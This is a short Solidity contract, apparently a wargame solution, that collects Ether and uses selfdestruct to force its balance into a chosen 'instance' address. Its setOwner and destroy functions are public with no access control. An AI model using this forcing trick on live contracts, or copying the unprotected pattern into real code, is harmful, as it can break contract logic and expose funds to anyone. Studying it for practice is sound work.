pragma solidity ^0.6.3;


contract ShutUpAndTakeMyMoney{
    address payable owner;
    
    function setOwner(address payable _owner) public{
        owner = _owner;
    }
     
    function destroy() public{  //before calling this function: 1) add money to this contract (either at deployment or with the giveMeMoney function) 2) call setOwner with as input your instance address
        selfdestruct(owner);
    }
    
    constructor() public payable{ //use the Value filed of RemixIDE to send Ether at creation of the contract
    }
  
    function giveMeMoney() public payable{ //use the Value field to send money (if you didn't send any at initiation)
    
    }

}
